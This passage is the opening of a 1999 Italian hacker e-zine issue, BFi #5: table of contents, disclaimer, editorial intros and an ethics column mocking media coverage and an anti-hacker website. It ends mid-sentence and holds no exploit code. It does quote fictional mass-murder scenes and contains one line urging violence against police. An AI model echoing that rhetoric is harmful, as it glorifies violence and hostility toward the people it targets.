
==============================================================================
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
--------------------[ BUTCHERED ]---[ FR0M ]---[ iNSiDE ]---------------------

                         J$$$$$$$.      $$$$$$$$     $$  
                         $$    J$%     d$"          d$"  
                        d$beeee$"     .$$eeee      .$P   
                       .$$""""$$.     $$"""""      $$"   
                       d$"    $$     .$P          .$P    
                      .$$$$$$$*" e$- $$       e$  $$  z$-
                      """""""    ^" ^""       ^" ^""  ^" 
---------------------[ BUTCHERED ]---[ FR0M ]---[ iNSiDE ]--------------------
------------------[ NUMER0 5 ]---[ ANN0 2 ]---[ MARZ0 1999 ]------------------


[ iNDiCE ]====================================================================
---[ iNTR0 ]------------------------------------------------------------------
------[ 01 ]-------------------------------------------------------[ SMaster ]
------[ 10 ]--------------------------------------------------------[ pIGpEN ]
---[ C0LUMNS ]----------------------------------------------------------------
------[ ETiCA ]---------------------------------------------------[ \sPIRIT\ ]
------[ NEWS ]--------------------------------------------[ pIGpEN + Cavallo ]
------[ MAiLB0X ]--------------------------------------------------[ Cavallo ]
---[ HACKiNG ]----------------------------------------------------------------
------[ GESTi0NE DEi PR0CESSi - PARTE III ]-------------------------[ pIGpEN ]
------[ ACES HiGH SCANNER v2.7 ]------------------------------------[ pIGpEN ]
------[ ACCT ]---------------------------------------------------[ bELFaghor ]
------[ SYSL0GD ]------------------------------------------------[ bELFaghor ]
------[ TCP/iP HACKS F0R PHUN AND PR0FiT ]---------------------------[ FuSyS ]
------[ iPSEC - ARCHiTETTURA Di BASE ]-------------------------------[ FuSyS ]
------[ NET RAiDER PR0JECT v0.0 ]---------------------------------[ \sPIRIT\ ]
------[ HACKiNG NT - PARTE II ]-------------------------------------[ Dashie ]
---[ PHREAKiNG ]--------------------------------------------------------------
------[ CALLERiD: RiFLESSi0Ni ]-------------------------------------[ pIGpEN ]
------[ L'ANG0LiN0 Di MAMMA TELEC0M ]--------------------------------[ Jaiss ]
---[ CRACKiNG ]---------------------------------------------------------------
------[ JAVA REVERSE ENGEENERiNG: LA JVM ]-----------------------[ LordFelix ]
---[ MiSCELLANE0US ]----------------------------------------------------------
------[ iNSTALLARE E C0NFiGURARE i TCP WRAPPERS ]-----------------[ Pr3DaToR ]
------[ C0ME FAR SUiCiDARE L'UTENTE Di WiND0WS ]-------------------[ Cavallo ]
------[ CAZZATE A NASTR0 ]----------------------------------------[ Dr.Slump ]
------[ iL TERREM0T0 FATT0 iN CASA ]---------------------------[ Dr.Bluedump ]
------[ MiCR0S0FT - ST0RiA Di UN M0N0P0Li0 ]----------------[ Carlo Gubitosa ]
------[ PARAN0iA ]----------------------------------------------[ BlackBerry ]
------[ FiRST BREAK-iN ]-----------------------------------------[ DevilKiss ]
[ E0F ]=======================================================================


[ DiSCLAiMER ]----------------------------------------------------------------
	Tutto il materiale contenuto in BFi ha fini eslusivamente informativi
	ed educativi. Gli autori di BFi non si riterranno in alcun modo
	responsabili per danni perpetrati a cose o persone causati dall'uso
	di codice, programmi, informazioni, tecniche contenuti all'interno
	della rivista.
	BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
	liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
	di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
	e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
	e cancella questo file dal tuo computer * . Proseguendo tu, lettore,
	ti assumi ogni genere di responsabilita' per l'uso che farai delle
	informazioni contenute in BFi.
	Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
	della rivista: distribuite BFi nella sua forma integrale ed originale.
------------------------------------------------------------------------------



==============================================================================
-----------------------------------[ iNTR0 ]----------------------------------
==============================================================================


------------------------------------[ 01 ]------------------------------------
---------------------------------[ SMaster ]----------------------------------

Questo quinto numero di BFi segna il passaggio al secondo anno di
pubblicazione della rivista.

Un grande ringraziamento va a tutte le persone che hanno contribuito alla
realizzazione dei numeri del 1998:
b0z0, bELFaghor, BlackBerry, Frank Black, Blinking, |CancerM|, Cavallo,
DaMaDaFaKa, Darker, Dark Schneider, DevilKiss, Eric Draven, Dr.Slump,
DrumFire, EleSSaR^, Fre, FuSyS, [goku], Hal9000, Alex Kuligk, InfectedMachine,
Jack McKrak, Jaiss, jH, L3ChucK, LeLe, Lobotomia, LordKasKo, MaNdrAkE,
Nefasto, Nello|Z, onid^, |PazzO|, PFloriK, PhoenYx QueztaCoatl, pIGpEN,
Pr3DaToR, PUCK, Raptor, |scacco|, Sh4mp00, Shanhy, sorbo, \sPIRIT\,
Technolord, The_Hawk, |TsuNaMi|, \\alV^iCf, VaNaDiO, Vide0Fuzzy, xOANON, Zen97.

Tornando al presente :) , vi faccio solo notare che nel file allegato
snip.tgz sono contenute le versioni Linux e DOS dell'utility che permette
di estrarre in modo immediato ed indolore ;) i sorgenti dei tool riportati nei
vari articoli.

Buona lettura...
	SMaster


------------------------------------[ 10 ]------------------------------------
----------------------------------[ pIGpEN ]----------------------------------

		LA BESTIA CHE GRIDAVA AMORE AL CUORE DEL MONDO

MU$iCA ASC0LTATA: Kiss your Fr33D0m, G00DByE - Lynyrd Skynyrd
CiB0: 1 Confezione di Orsetti Haribo (quelli gialli e rosa)
      1,5 litri di Pepsi

SALuTi: beh sicuramente a tutti quelli che mi stanno vicino,
        a coloro che mi mandano query in irc solo per scambiare
        4 chiacchiere e a coloro che mi tengono lontano dall'hacking.

Ringraziamenti:
- a quella ragazza a cui e' dedicato il PC 192.168.1.2 nella mia rete di casa
- a Drow_Emperor che quasi quasi riusciva a convincermi a giocare con il PC
- a quel mio amico con cui ho installato il DHCP in quel fantastico posto ;)
- a Van Zant.. chi non ha mai ascoltato i Lynyrd Skynyrd si compri Last Rebel
- a Jeff Healey... se passo in Canada lo vado ad ascoltare e poi fuggo in 
  Alaska... sisi mi fermo pure un po' a Seattle

Per l'intro di questo numero ho scelto questo passo... non lo so perche',
probabilmente l'ho collegato al fatto che due hackers in Cina sono stati
condannati alla pena di morte... hackers... probabilmente e' una categoria
incompresa dai molti... qui, sul brano che vi riporto, siamo sul
fantastico-assurdo di una mente diabolika...

Ammetto che c'e' poco da comprendere quando si rubano soldi... ma da qui
alla pena di morte c'e' di mezzo altro che Internet...

           "The Beast That Shouted Love at the Hearth of the World"
                                Harlan Ellison

Dopo un'oziosa discussione con il disinfestatore che veniva una volta al mese
a irrorare l'esterno della sua casa nella sezione Ruxton di Baltimora, William
Sterog rubo' una tanica di Malathion, un veleno insetticida mortale, dal camion
dell'uomo e usci' una mattina presto, seguendo il corso del lattaio del
quartiere, e verso' quantita' medio-grandi in ogni bottiglia lasciata sui
gradini di settanta case. Dopo sei ore dall'azione di Bill Sterog, duecento tra
uomini, donne e bambini morirono tra convulsioni e dolori.
Venuto a sapere che una zia abitante a Buffalo stava morendo di cancro alle
ghiandole linfatiche, William Sterog aiuto' sua madre a preparare in fretta tre
valigie e la condusse al Friendship Airport, dove la carico' su un jet della
Eastern Airlines con una semplice ma efficiente bomba ad orologeria costruita
con una sveglia Westclox Travelalarm e quattro bastoncini di dinamite, e
sistemata in una delle tre valigie. Il jet esplose nei pressi di Harrisburg,
Pennsylvania. Novantatre' persone, inclusa la madre di Bill Sterog, furono
uccise nell'esplosione e i rottami in fiamme causarono altri sette morti,
precipitando in una piscina pubblica.
Una domenica di novembre, William Sterog ando' alla Babe Ruth Plaza sulla
33a Strada, dove divenne uno dei 54.000 tifosi che stipavano il Memorial
Stadium per vedere i Baltimore Colts che giocavano contro i Green Bay Packers.
Aveva un vestito pesante, calzoni di flanella grigia, pullover blu a collo di
tartaruga e un pesante maglione di lana irlandese lavorata a mano sotto
l'impermeabile. Quando restavano da giocare tre minuti e tredici secondi del
quarto tempo, e il Baltimore premeva diciassette a sedici sulla linea delle
diciotto iarde del Green Bay, Bill Sterog si fece largo tra la folla verso
l'uscita al di sopra dei posti del mezzanino, e frugo' sotto l'impermeabile
per prendere il mitra M-3, residuato dell'Esercito, che aveva comprato per
$ 49,95 da un commerciante d'armi di Alexandria, Virginia, che vendeva per
corrispondenza. Mentre 53.999 tifosi urlanti balzavano in piedi - migliorando
ancora le sue possibilita' di tiro - e mentre la palla finiva al quarterback,
che la tratteneva per il tackle difensivo con ogni probabilita' di segnare,
Bill Sterog apri' il fuoco contro le schiene dei tifosi schierati sotto di
lui. Prima che la folla potesse bloccarlo, aveva ucciso quarantaquattro
persone.


ok that's all
spazio agli articoli...

pIGpEN



==============================================================================
----------------------------------[ C0LUMNS ]---------------------------------
==============================================================================


-----------------------------------[ ETiCA ]----------------------------------
----------------------------------[ \sPIRIT\ ]--------------------------------

-  ERA MEGLi0 M0RiRE DA PiCC0Li -
...che morire da grandi e loggati...

(PARENTAL ADVISORY - explicit flames, handle with care)

Febbraio 1999, mancano 10 mesi all'inizio del nuovo millennio, e tutti siamo
qui in trepidante attesa, cosi' per fare un po' di casino quando verra' la
mezzanotte fatidica. Champagne, fireworks e file shredder alla mano.
Magari siamo anche tutti speranzosi che il 2000 porti cambiamenti
sostanziali all'ambiente che ci circonda, il cosiddetto "sistema" (se
pIGpEN ha ancora fiducia, io ne ho ben poca...). Penso rimarremo tutti
delusi, nessuno fra il 31 dicembre 99 e il 1 gennaio 2000 dara' fuoco
all'ufficio Telecom sotto casa, e tanti altri scazzi simili.
La cosa che in questo momento mi fa' piu' riflettere e' il girare per la
rete e le edicole e vedere il proliferare di sedicenti
esperti/hackers/santoni/antihackers/cops, ma anche di newbies (che non
e' un termine negativo) e lamerz (e qui la negativita' raggiunge livelli
stellari).
C'e' una certa tendenza a uscire dall'ombra, spacciando prodotti che,
lasciando stare la buona volonta', sarebbe stato meglio non far uscire o
pensare con basi diverse.
Abbiamo la zine del canale #phreak.it, UnDeR CoNsTrUcTiOn, che sinceramente
spero non vada mai oltre l'unico numero uscito, causa contenuti banali e
gia' sentiti e un certo senso di elitarieta' che traspare dall'introduzione,
che obiettivamente di el33t non ha proprio nulla.
Abbiamo la zine NewBies, che apprezzo se non altro perche' scritta, appunto,
da newbies per altri newbies, e che va a riempire un settore che potrebbe
fare proseliti verso l'arte della curiosita'. Sono un po' meno d'accordo
sugli articoli sui green, per i fatti accaduti di recente e per la mia nota
avversione a quegli 167-eccetera-eccetera. Se volete leggerla comunque la
trovate a http://www.newbies.tsx.org, ricordate che SpIRIToZ non sono io, e
che abbatterei impietosamente la falce su articoli come "COMPUSERVE",
"GREEN: MA QUANTI CAZZ CE NE SONO", "COME SI DIVENTA HACKER IN POCHI
SEMPLICI PASSI?" (...), "GREEN UPDATE" e altri. Se andiamo avanti cosi'
troveremo presto in edicola il corso DeAgostini per diventare hacker in 50
comode uscite settimanali con raccoglitore e videocassette esplicative, in
omaggio la bluebox da montare e l'exploit da passeggio.
C'e' http://www.spaghettihackers.it, che al di la' della pura trovata
pubblicitaria, lascia il tempo ad Andrea Monti di spalare merda a badili
sulle nostre vecchie glorie, da The Black Page a System Down (rimosso a
settembre '98 da andrew.org da un sospetto host24.giustizia.it).
Ha ragione pIGpEN... chissa' perche' la figura dell'"hacker" (e se lo metto
tra virgolette e' perche' credo che di hackers nel vero senso del termine ce
ne siano ben pochi qui in Italia) e' demonizzata dai media ed esaltata dagli
smanettoni. Gli articoli sui giornali si sprecano sempre, dalle
parzialmente innocue polemiche sugli effetti dei videogames (l'ultimo e' su
SETTE del Corriere della Sera, N.1 1999) ai piu' fastidiosi sproloqui dei
sopracitati sedicenti esperti, una settimana si' e una no sulla carta
stampata della seconda meta' del '98, mai su pubblicazioni autorevoli ma
sempre su L'Espresso, Panorama, cazzilli simili e con gran quantita' di
stronzate sentite chissa' dove. Persino su "D - la Repubblica delle Donne"
di un paio di mesi fa, in mezzo a cosmetici e ricette di cucina.
La piu' comica e' stata a settembre, quando sul Venerdi' o Sette, non
ricordo, otto pagine di articolo sull'Hackit (con qualche mese di ritardo)
facevano sfoggio sapiente di foto qua e la'. Una delle tante mostrava un
mio amico durante un'installazione di Windows. L'ho chiamato per commentare
la pessima scelta dell'immagine (che onta, Windows 95...) e in tutta
risposta mi ha liquidato con un laconico "Era Windows 98...". Fate due
calcoli, l'Hackit era a giugno. Era per tenere acceso il fuoco?
Dalla carta stampata alla rete stessa, le cazzate aumentano in dismisura.
http://www.fol.it/ergo/eduardofreni/ e' stato abbondantemente commentato da
FuSyS nello speciale natalizio di BFi, altre pagine simili abbondano (ne ho
trovata una su Geocities, peccato non ricordi l'URL, che vantava piu' di
50.000 accessi in meno di un mese, mostrava una e-mail ricevuta da un
individuo X che proclamava la categoria Hacker come padrona incontrastata,
faccioquelcazzochevoglio eccetera. Puzzava di falso lontano chilometri,
secondo me se l'erano scritta da soli, anche perche' ho notato qualche
incongruenza nell'header ("coscienziosamente" riportato per intero). Che
sperassero facesse sensazione e non se ne accorgesse nessuno?
Non conto piu' le persone che fuori dalla rete mi danno del delinquente e
terrorista e quelle che in irc aprono query che cominciano sempre con
"tu sei sPIRIT di BFi!!"... oooooooohhh stupore. La cosa non darebbe
fastidio, se non che un 50% di questi leccano il culo e il restante 50%
tirano merda dopo pochi minuti dandosi arie, e mi chiedo se le iniezioni di
anidride carbonica a 'sta gente le abbia prescritte il medico o sia una
iniziativa personale. Insomma, il liscio, il gasato, il Ferrarelle. Che ho
fatto di straodinario nella mia carriera, a parte farmi i cazzi miei e
cercare di tirare fuori qualcosa di nuovo?
"Voi siete dei guru!" - no comment, mi pare che nessuno di noi si chiami
John Draper.
Anzi, in questa sede invito l'Italian Hackers Crew a eliminare il mio nome
dalla lista dei collaboratori, che evidentemente si sono fatti qualche idea
strana. Guardateveli a http://members.tripod.com/~ithackcrew/index.html, e
trattenete la risata alla pagina degli "Utilissimi tools - Scritti in
Visual Basic 5.0 da...". No comment, me lo fai il porting POSIX per favore?
"La nostra crew spacca e siamo i piu' attivi! Voi non siete nessuno" - e qui
scatta l'ignore quando scopro che il gruppo di cui parla e' in giro da un
mese e hanno tutti installato Windows 98. Rincariamo la dose precisando che
l'ultimo della serie si e' presentato come cracker, e ha scoperto durante la
query che esiste un programma di nome SoftICE di cui tutti parlano molto.
Chissa' se ripensandoci a 'sto tipo non comincino ad andargli stretti i
crack e i seriali che trova in rete, e la smetta con le anfetamine.
E poi smettiamola per favore di giocare agli hackers, che non e' tempo ne'
luogo, e il bust di meta' mese lo conferma in pieno.
Tanto lo sappiamo che i primi che vengono presi sono sempre i lamers, i
pesci piccoli, gli smanettoni piu' incoscienti. E non venitemi a dire che
attaccare banche tedesche e il Fondo Monetario Internazionale da una
macchina di polito.it e' stata una grande azione, che a FBI e Interpol la
cosa non e' andata giu'. Cosi', da una denuncia al polito e' partita la
denuncia alla SCO, e log alla mano hanno visto qualche ip CIS di troppo e
hanno deciso di fare una bella pulizia.
E poi trovo articoli come su NewBies #1 che trattano ancora di green e di
come generarsi gli account Compuserve, questa e' mancanza di buonsenso. Non
so' se CDP e compagnia bella di SpaghettiPhreakers abbiano ancora voglia di
tenere in piedi quella cosa chiamata Green Exchange Project, spero (per
loro) di no.
Certa gente farebbe bene a tornare a giocare con le macchinine.
Dai, costa cosi' tanto sedersi qualche oretta ogni tanto al pc, rubando
tempo ad alcool, sostanze stupefacenti e rapporti sociali non finalizzati
alla semplice riproduzione (leggasi: caccia al sesso opposto), e cercare di
imparare e creare qualcosa di nuovo?
Ora, non che non sia d'accordo al principio di massima diffusione della
informazioni, ci mancherebbe altro, ma un po' di sale in zucca per
l'utilizzo, pliz, che i magistrati dovrebbero pensare a ben altro che a
noi (capito Corasaniti? Una bella seduta di ipnosi e ti passa anche la
mania di onnipotenza da Gesu' Cristo della rete).
Evidentemente abbiamo esagerato un po', in questo campo la pubblicita' non
e' mai una cosa prudente. Al massimo andremo al Costanzo Show per trovare
lavoro.
Se proprio si trovasse il pozzo dei desideri, quello che funziona, lanciamo
una monetina e chiediamo un rewind del nastro, che la commedia sta'
diventando tragedia. A costo di perdere Infostrada, Wind, Albacom, Tiscali,
ridateci la tranquillita'. Bollette per tutti, se significasse dormire bene
la notte. Magari un 2600hz, se c'e' una monetina da buttare... e se esiste
un Dio, di quelli veri pero', ascolti le nostre preghiere e mandi un
inviato quando finisce la birra. Chi puo' bagni il monitor col sangue di
un cop, e sara' risparmiato. Ramses, let my people go!

cat flames > /dev/null
echo "Informations want to be free - but use with care" > /etc/motd

I saluti di rito oggi vanno ai canguri di pIGpEN, che spero vivamente di
vedere dalle nostre parti a breve, ai disLESSici che sono tutti dei
simpaticoni, a quell'isola felice che si chiama EFNET, a N0boDY88 e ZeroCool
che spero abbiano capito a cosa mi riferivo al loro riguardo, a Desdy, a
^^Susanna, allo staff dell'Hackingirls e ovviamente a tutti i fratelli del
s0ftpj, che, senza voler sollevare polemiche, hanno dimostrato di avere la
testa al posto giusto e di non ragionare col culo.
                                                     \sPIRIT\


- D0RMi ADESS0, E' TUTT0 FiNiT0... -

Non e' possibile... ho finito da circa due ore di scrivere il pezzo "Era
meglio morire da piccoli", che mi trovo di nuovo a dover rubare tempo al
NetRaider per commentare i deliri dell'ennesimo branco di santoni trovati
nei fustini del Dixan... Se leggete, nell'"Era meglio morire da piccoli..."
parlavo di un sito su Geocities che non ero piu' riuscito a trovare...
ebbene, l'ho ritrovato, gustatelo anche voi, sperando non vi vada di
traverso come e' successo a me:

http://www.geocities.com/SiliconValley/Port/4355

Ci sarebbe da chiedersi se vale la pena di accanirsi su esempi simili di
ottusaggine e ignoranza, ma questa volta mi sento, e penso si sentiranno i
miei colleghi, direttamente PRESO IN CAUSA. Questi espertoni hanno letto la
nostra pagina web... hanno letto BFi... io leggo loro, e non posso
trattenere una sonora risata e un commento piu' che infuocato. Del resto se
lo sono cercato, non fosse altro per la marea di stronzate. Cominciamo...

[ Il testo delle pagine fra virgolette, i commenti tra parentesi quadre ]
[ Un [...] indica un pezzo che non riporto dalle pagine                 ]

                          -- [file index.html] --

"Gruppo IL TIMONE Firenze"

 [...]

"Questa pagina e' dedicata a te, e alla tua sicurezza.
 Abbiamo disposto questo sito per informarti su come fare a navigare
 in  assoluta sicurezza, senza aver timore alcuno di Hacker, Lamer,
 Nuke, Cracker Virus e altro."

 [ Una copia del sito di Eduardo Freni, che ha ampiamente commentato ]
 [ FuSyS sullo speciale natalizio di BFi? Beh, dove sono queste      ]
 [ informazioni? Oggi, giovedi' 25 febbraio, non c'e' ancora nulla   ]
 [ tranne i vostri deliri...                                         ]

 [...]

"Ti informiamo su quelli che sono gli elementi di disturbo, come si
 comportano e ti diciamo chi sono."

 [ Bene, degli head-hunters... o dei semplici curiosoni...           ]

"Un grazie particolare a Eduardo Freni che ha promosso la formazione
 del gruppo, e ha messo a disposizione mezzi e tecnologie. Avremmo
 voluto averlo con noi ma, in questo momento e' troppo assorbito dal
 lavoro e'  non ha tempo per partecipare a questa bella iniziativa."

 [ E' per caso quel contratto di assoluta segretezza auspicato da    ]
 [ FuSyS, grazie al quale ha imparato i comandi /net?                ]

"Il sito sulla sicurezza di Eduardo ha cessato di vivere perche' era
 troppo pieno di lavoro e lui non poteva seguirlo piu' in modo
 decente. Questo sito ha avuto qualcosa come 50.000 utenti in 40
 giorni di attivita'. Freni ha ricevuto e ha risposto a oltre 6.800
 E_mail. E' un po' troppo per una sola persona."

 [ Eh pare anche a me... troppo troppo...                            ]

"Quindi ha costituito un gruppo di volontari come esposto nella
 pagina Chi Siamo."

 [ Questo significa che gli sbandierati 50.000 utenti hanno potuto   ]
 [ leggere delle informazioni sbagliate senza alcuna utilita'... e   ]
 [ credo che chiunque se ne intenda un minimo converra' con me.      ]
 [ Vi rimando ancora una volta allo speciale natalizio di bFI.       ]

 [...]

"La nostra Associazione ha attualmente sei membri che firmano in modo
 congiunto queste pagine, non sono resi pubblici i cognomi a causa
 delle possibili ritorsioni che potrebbero venire dal mondo hacker.

 Grazia
 Monica
 Vincenzo
 Carlo
 Stefano
 Sabrina"

 [ Non pubblicano i loro cognomi perche' temono eventuali ritorsioni ]
 [ da parte del mondo hacker, e su questo posso anche essere         ]
 [ d'accordo... ma se poi, visitando il sito, si scopre che non c'e' ]
 [ uno straccio di indirizzo email tramite il quale comunicare con   ]
 [ loro, tutto assume ancora di piu' l'aspetto di una farsa...       ]
 [ In ogni caso andiamo avanti, che le cose si fanno sempre piu'     ]
 [ interessanti...                                                   ]

                     -- [file cs.htm - "Chi Siamo"] --

 [ Niente di nuovo, sembra la copia dell'index, se non fosse per due ]
 [ righe...                                                          ]

 [...]

"Freni ha costituito il gruppo, formato le persone, che hanno i
 seguenti requisiti minimi.

 Profonda conoscenza hardware PC.
 Almeno 6 anni di esperienza nel Software."

 [ Cominciate con lo spiegarmi che significa "Almeno 6 anni di       ]
 [ esperienza nel Software."... che vuol dire? Che sono sei anni     ]
 [ che vi hanno insegnato a lanciare un programma? Di quale          ]
 [ software state parlando? Sistemi operativi, tools di auditing,    ]
 [ linguaggi di programmazione, DTP, CAD, videogames, roba molle     ]
 [ generica????							     ]

 [...]

                     -- [file pm.htm - "Premessa" ] --

 [...]

"Con questo sito non vogliamo insultare ne' denigrare nessuno.
 Tuttavia, ogni cosa che viene citata tranne le ipotesi, e' vera e
 reale."

 [ E, soprattutto, non vengono citate le fonti... che strano...      ]

"Siamo completamente trasparenti verso gli utenti."

 [ Gia', cosi' trasparenti che non c'e' nemmeno uno straccio di      ]
 [ indirizzo di email...                                             ]

"Quanto viene detto degli Hacker e dei Lamers e' vero, e' reale.
 Vi indicheremo i siti Hacker in modo che voi possiate vedere con i
 vostri occhi e ragionare con la vostra testa."

 [ Come per le informazioni promesse, ancora nessuna traccia di      ]
 [ links... eppure dimostrano che almeno il nostro sito l'hanno      ]
 [ visitato...                                                       ]

 [...]

                   -- [file Ipotesi.htm - "Ipotesi" ] --

 [...]

"1.a HP"

 [ Cenno di cultura generale... HP e' l'abbreviazione per Hypotesis, ]
 [ termine greco... che l'abbiano messo li' apposta per fare sfoggio ]
 [ di cultura classica? A parte che l'abbreviazione corretta e' Hyp. ]

"Bill Gates ha praticamente battuto tutti. I diretti concorrenti,
 anche ipotetici, sono stati demoliti, chi si e' opposto, e' finito
 alle corde da dove non si e' piu' ripreso.
 Usando il software, e l'abilita' commerciale Microsoft si e' imposta,
 e nessuno riesce a fermarla."

 [ Con metodi concorrenziali scorretti, e l'Antitrust degli States   ]
 [ pare essersene accorta da un bel po'... L'invito a questo punto   ]
 [ e' di leggersi un'altro articolo di questo numero di BFi sulla    ]
 [ storia del monopolio Microsoft, e magari anche gli Halloween Docs ]
 [ che potete trovare a http://www.opensource.org/halloween1.html    ]

 [...]

"Un sito Hacker collegato ad Internet, costa in Italia, oltre 200
 milioni l'anno, ed ha pochissime entrate. Ora... o gli Hacker sono
 imprenditori rincoglioniti, oppure qualcuno li finanzia. Quale e' la
 prima caratteristica dei siti Hacker? Quella di parlare male del
 software Microsoft e di fornire strumenti facilmente utilizzabili,
 per aggredire sistemi operativi Microsoft, ed in particolare
 Windows 95/98 e soprattutto Windows NT."

 [ Se c'e' un limite all'idiozia, in queste righe e in quelle che    ]
 [ seguono, il nostro Gruppo Timone l'ha abbondantemente superato.   ]
 [ Tralasciando il fatto che il nostro sito mi sembra non costi una  ]
 [ lira, la maggior parte degli hacker, o "smanettoni" come Andrea   ]
 [ Monti ama definirli, prima di tutto non hanno alcun introito      ]
 [ economico per il loro lavoro di ricerca, in secondo luogo non     ]
 [ vengono finanziati da nessuno...                                  ]
 [ Uno dei picchi dell'idiozia e' che sia prerogativa degli hackers  ]
 [ parlare male del software Microsoft (forse perche' non e' ne'     ]
 [ il migliore, ne' il piu' stabile, ne' il piu' economico?) e       ]
 [ fornire strumenti per aggredire sistemi operativi Microsoft...    ]
 [ Evidentemente il 95% degli exploit la' fuori, per tutti vari      ]
 [ *nix, sono solo frutto della mia immaginazione...                 ]

"Alcuni di questi strumenti sono complessi, richiedono una grossa
 preparazione sia nel linguaggio di programmazione con cui sono
 fatti, ma soprattutto nei protocolli di comunicazione che Internet
 utilizza. E' noto che i programmatori sono delle persone che amano
 le sfide, ma noi non ne conosciamo nemmeno uno che si getterebbe
 in un progetto come Back Orifice, senza guadagnarci una lira, anzi
 rimettendoci un pacco di soldi cosi'."

 [ Ah... il Back Orifice adesso e' un progetto in grande stile che   ]
 [ e' costato un pacco di soldi? Oddio... non sapevo che creare il   ]
 [ NetRaider mi mandera' in rovina... e quanto mi costera'? Un tot   ]
 [ di lire ogni riga di codice, da pagare al Notepad, o il           ]
 [ compilatore si fa pagare a ore?                                   ]
 [ E poi come spieghiamo che in un'altra pagina 'sti tizi dicono che ]
 [ un hacker "A livello software, non e' normalmente in grado di     ]
 [ usare i compilatori e o strumenti evoluti di programmazione"???   ]

"Evidentemente al di la' delle belle intenzioni, vi e' qualcuno che
 appoggia gli Hacker. In questo caso occorrono 2 tipi di appoggi,
 uno tecnico, altrimenti non sarebbe stato possibile costruire ad
 esempio lo sniffer di ICQ, prego guardatevi i sorgenti in c++, uno
 di tipo finanziario. Chi puo' avere interesse a dirigere gli Hacker
 contro la Microsoft? Ed in particolare come mai vi e' tanto
 accanimento verso Windows N.T.?"

 [ Continua la caduta libera di questi folli... dalle loro parole    ]
 [ sembra quasi che senza la Mirabilis sarebbe stato impossibile lo  ]
 [ sniffer ICQ... il reverse engineering non esiste? Lo sniffing dei ]
 [ pacchetti da elaborare in seguito nemmeno? Complicato il sorgente ]
 [ in C++? O questi hanno programmato in Basic fino a ieri, o la     ]
 [ loro esperienza di almeno 6 anni nel software non comprendeva i   ]
 [ linguaggi di programmazione...                                    ]
 [ A parte tutto, noto un certo materialismo in tutte le loro        ]
 [ parole... che siano pagati da Microsoft? E poi, sono cosi'        ]
 [ convinti che il software Microsoft sia effettivamente il          ]
 [ migliore? Devo far leggere anche a loro gli Halloween Docs?       ]

 [...]

"Insomma la storia ci insegna che le guerre si fanno solo per due
 motivi:
 Religione, o fede politica analoga (vedi comunismo);
 Economia.
 Chi sta portando gli attacchi al software della Microsoft non lo
 sta certo facendo per religione, quindi non rimangono altro che i
 motivi economici."

 [ Comodo tirare in ballo la storia in un campo che non c'entra un   ]
 [ benemerito cazzo... E' una mia impressione o sono troppo legati   ]
 [ a certi schemi rigidi di pensiero?                                ]

"Conclusione:
 Secondo noi vi sono almeno due tipi di Hacker, l'Hacker che prende
 i soldi da SUN Microsystem & c. che e' da considerarsi un
 Imprenditore, che fa un lavoro e prende la sua retribuzione.
 L'Hacker scemo, che lavora gratis per SUN, rischiando la fedina
 penale, senza ricevere altro che la soddisfazione di pagare una
 salata bolletta a Telecom, per violare siti e produrre danni
 utilizzando software prodotto da altri."

 [ Questo lo mandiamo a Sun Microsystems Italia, poi ci sediamo e    ]
 [ contiamo le querele....                                           ]

                   -- [file: hckmain.htm - "Hacker" ] --

"Cosa e' un hacker?"

 [...]

"Gli hacker sono persone scorrette che cercano di penetrare reti e
 sistemi informatici al fine di carpire informazioni, tecniche,
 economiche, o altro. L'hacker, se puo', danneggia il sistema che
 viola al fine di poter ripetere il proprio ingresso nello stesso."

 [ Gia', quasi mai lo fa' per mettere alla prova le proprie          ]
 [ conoscenze... andiamo, un minimo di serieta', la percentuale      ]
 [ di intrusioni perpetrate con lo scopo di danneggiare il sistema   ]
 [ e' minimo...                                                      ]

"Quale e' il livello di preparazione dell'hacker?"

 [ E qual'e' il vostro, scusate?                                     ]

"A livello di computer, di hardware e' piuttosto basso, anche se
 fornito di una buona preparazione teorica, in pratica, se si trova
 a dover montare una scheda su di un pc, e' imbranato quanto un
 ragazzino inesperto."

 [ Uhm? Che faccio adesso? Non sapevo di tenere aperti i computers   ]
 [ per far circolare l'aria... e qualcuno mi spiega come mai i miei  ]
 [ computers li ho montati da solo? Ero sotto effetto di droghe?     ]

"A livello sistemistico, ha una pessima preparazione teorica ed un
 ottima preparazione pratica. Quindi riesce a penetrare i sistemi,
 spesso, grazie ad informazioni che arrivano o da altri hacker, o in
 qualche modo rubate."

 [ Maddai... davvero? Penetrano i sistemi con informazioni di altri  ]
 [ Hacker... e questi ultimi, visto che appartengono alla categoria, ]
 [ dove le hanno prese queste informazioni? Che c'e' in cima alla    ]
 [ scala, un potere onniscente che dona al popolo queste             ]
 [ informazioni?                                                     ]

"A livello software, non e' normalmente in grado di usare i
 compilatori e o strumenti evoluti di programmazione. Anche in
 questo caso ha una ottima preparazione teorica, e nessuna
 preparazione pratica. Se si esclude un po' di Java Script, ed un
 po' di html, l'hacker non sa fare nulla di professionale e valido."

 [ ... sarei tentato da non commentare... e i sorgenti in C++ dello  ]
 [ sniffer ICQ di cui si parlava sopra? E gli exploit? E tutti i     ]
 [ tools di sicurezza che si trovano in giro? Quelli sono fatti in   ]
 [ Javascript e Html? Linux poi? Forse la meta' del codice che c'e'  ]
 [ dentro e' fatto da hackers o ex hackers? Ah gia', non e'          ]
 [ Microsoft, quindi non conta...                                    ]

"A livello di lavoro scopriamo che gli hacker fanno di mestiere:
 Macellai, Fruttivendoli, Barbieri, Impiegati, (raramente tecnici),
 Maestri d'Asilo, Studenti di varie facolta', Cuochi, Barman,
 disoccupati ed altro."

 [ Qui mi astengo sul serio dal commentare... faccio solo notare una ]
 [ certa vena di razzismo nel vostro discorso...                     ]

"Vorrebbero lavorare con l'informatica... ma nessuno li assume
 perche' non hanno esperienza, oppure perche' sono scorretti e violano
 i computer o le reti dei colleghi o cercano di carpire informazioni
 tecnologiche per poi rivendele al miglior offerente.
 Sono fondamentalmente delle persone scorrette, che usano la propria
 intelligenza per fregare e o opprimere il prossimo.
 Sono degli opportunisti, persone che se hanno una informazione
 anche minima, la usano per ricattare il prossimo. Se non hanno
 informazioni per ricattare se le costruiscono, e ci provano lo
 stesso. Non usano l'intelligenza per costruire, per fare, ma bensi'
